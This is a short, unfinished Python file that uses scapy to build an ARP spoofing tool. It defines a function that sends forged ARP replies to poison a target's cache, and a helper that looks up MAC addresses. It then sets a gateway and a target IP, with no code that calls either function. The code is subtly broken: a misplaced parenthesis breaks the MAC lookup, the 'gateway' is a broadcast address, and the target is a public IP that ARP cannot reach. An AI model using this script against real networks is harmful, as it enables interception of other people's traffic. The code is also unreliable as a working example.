import scapy.all as scapy

def spoof(target_ip, target_mac, spoof_ip):
    ARP_packet = scapy.ARP(pdst = target_ip, hwdst = target_mac, psrc = spoof_ip, op = "is-at")
    scapy.send(ARP_packet)

def get_mac(ip):
    arp_request = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff"/scapy.ARP(pdst = ip))
    reply, x = scapy.srp(arp_request, timeout = 5, verbose = 0)
    if reply:
        return reply[0][1].src
    return None

default_gateway = "192.168.137.255"
target_ip = "213.57.182.162"

